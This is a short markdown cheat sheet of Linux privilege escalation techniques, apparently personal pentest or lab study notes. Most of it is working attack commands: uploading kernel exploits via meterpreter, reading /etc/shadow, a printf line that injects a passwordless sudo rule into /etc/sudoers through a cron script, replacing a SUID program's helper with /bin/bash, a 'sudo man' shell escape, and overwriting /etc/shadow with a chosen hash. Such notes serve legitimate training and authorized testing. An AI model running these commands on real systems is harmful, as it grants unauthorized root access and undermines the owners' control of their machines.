# Linux Privilege Escalation

--------------------------------------------------------------------

## kernel Exploits: (Dangerous)

```
Linux-exploit-suggester (Github Tool) 

$ cat /etc/passwd

search the vulnerability, download it and do what it indicates

upload the binary to the victim machine

meterpreter> upload /Downloads/script.c

we can login from ssh

$ cat /etc/shadow
```

--------------------------------------------------------------------

## Exploiting Cron Jobs:

```
$ crontab -l

$ cd/ 

$ grep -rnw /usr -e “/home/student/message” (to see if something is useing that path)

If we noticed that there is a .sh script that uses it so we are going to try to set commands on it

If we dont have any txt editor:
$ printf ‘#!/bin/bash\necho “student ALL=NOPASSWD:ALL” >> /etc/sudoers’ > /usr/local/share/copy.sh
```

--------------------------------------------------------------------

## SUID binaries:

```
$ file welcome
$ strings welcome

As the program calls other binary we remove it and create other one as a copy of a /bin/bash

$ rm greetings

$ cp /bin/bash greetings

$ ./welcome (we get a root command)
```

--------------------------------------------------------------------


## SETUID - SUDO privileges

> https://gtfobins.github.io/

```
$ find / -user root -perm -4000 -exec ls -ldb {} \;

$ find / -perm -u=s -type f 2>/dev/null

$ sudo -l
```

--------------------------------------------------------------------

## e.g. User can run 'man' with SUDO Privileges

```
$ sudo man ls

$ !/bin/bash
```

--------------------------------------------------------------------

## e.g. of /etc/shadow with write permissions

```
$ openssl passwd -1 -salt abc password123

$ vim /etc/shadow # Paste the hashed password

$ su
```

--------------------------------------------------------------------

## Writable files

```
$ find / -not -type l -perm -o+w
```

--------------------------------------------------------------------